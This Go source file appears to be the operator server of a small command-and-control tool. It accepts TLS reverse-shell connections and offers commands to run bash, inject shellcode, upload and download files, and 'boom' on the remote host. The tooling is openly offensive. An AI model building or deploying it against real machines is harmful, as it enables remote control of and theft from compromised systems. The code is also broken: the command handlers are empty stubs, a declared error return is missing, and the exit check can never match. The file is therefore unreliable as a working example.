package useri

import (
	"bufio"
	"bytes"
	"errors"
	"fmt"
	"github.com/hashicorp/yamux"
	"github.com/kmahyyg/dumbc2/config"
	"github.com/kmahyyg/dumbc2/remoteop"
	"github.com/kmahyyg/dumbc2/transport"
	"github.com/kmahyyg/dumbc2/utils"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strings"
	"time"
)


func StartServer(userOP config.UserOperation) {
	// server mode
	fladdr := userOP.ListenAddr
	lbserver, err := transport.TLSServerBuilder(fladdr, true)
	if err != nil {
		panic(err)
	}
	for true {
		if lbserver != nil {
			log.Println("Listen to Port Successfully, Wait for connection...")
			conn, err := lbserver.Accept()
			if err != nil {
				log.Println(err)
				continue
			}
			_ = conn.SetDeadline(time.Now().Add(time.Minute * 10))
			handleClient(conn)
		} else {
			log.Fatalln("Failed to bind.")
		}
	}
}

func handleClient(conn net.Conn) {
	// start as tls server, means it's a reverse shell
	fmt.Println("Connection established.")
	fmt.Println("Commands: upload, download, boom, bash, exit, help, shellcode.\n")
	ymconf := yamux.Config{
		AcceptBacklog:          256,
		EnableKeepAlive:        true,
		KeepAliveInterval:      time.Second * 20,
		ConnectionWriteTimeout: time.Minute * 5,
		MaxStreamWindowSize:    256 * 1024,
		LogOutput:              os.Stderr,
	}
	ymserv, err := yamux.Server(conn, &ymconf)
	if err != nil {
		log.Fatalln(err)
	}
	cleanup := func() {
		_ = ymserv.Close()
		_ = conn.Close()
	}
	defer cleanup()
	for true {
		fmt.Printf("[SERVER] %s [>_] $ ", conn.RemoteAddr().String())
		useript := utils.ReadUserInput()
		useriptD := strings.Split(useript, " ")
		recvconn, err := ymserv.Accept()
		if err != nil {
			log.Println("Mux Error.")
			continue
		}
		userCmd := &remoteop.UserCmd{}
		err = userCmd.ParseUserInput(useriptD)
		if err == errors.New("USER_EXIT") {
			return
		} else if err != nil {
			log.Println(err)
			continue
		}
		err = UserCommandProcess(userCmd, recvconn)
	}
}

func UserCommandProcess(ucmd *remoteop.UserCmd, stream net.Conn) error {
	switch ucmd.Cmd{
	case remoteop.CommandBOOM:
	case remoteop.CommandINJE:
	case remoteop.CommandUPLD:
	case remoteop.CommandDWLD:
	case remoteop.CommandBASH:
	default:
		log.Fatalln("Internal Error")
	}
}
